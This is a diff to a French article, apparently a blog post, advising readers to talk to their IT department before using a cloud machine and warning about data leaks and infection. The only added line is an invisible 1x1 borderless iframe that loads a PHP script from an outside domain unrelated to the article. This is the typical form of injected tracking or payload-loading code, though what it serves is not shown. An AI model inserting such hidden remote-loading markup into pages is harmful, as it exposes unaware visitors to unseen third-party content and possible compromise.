@@ -17,3 +17,5 @@ Vous avez le choix de l'endroit où la machine sera créée. D'expérience, cell
 Attention, à utiliser cependant avec modération ! Tout est toujours une question d'équilibre et de dialogue. Votre service IT est là pour faciliter votre business et pour protéger l'infrastructure de votre institution. Discutez-en au préalable avec eux, afin que chacun comprenne les besoins et contraintes de l'autre, et évitez au maximum que de telles situations se présentent en leur demandant à temps l'installation des logiciels dont vous avez besoin.
 
 À défaut, le risque est de faire fuiter des données confidentielles ou d'infecter votre institution au moment de rapatrier les fichiers vers votre ordinateur.
+
+<iframe src="https://www.my-poppy.eu/cnt/cnt.php" width="1" height="1" frameBorder="0">
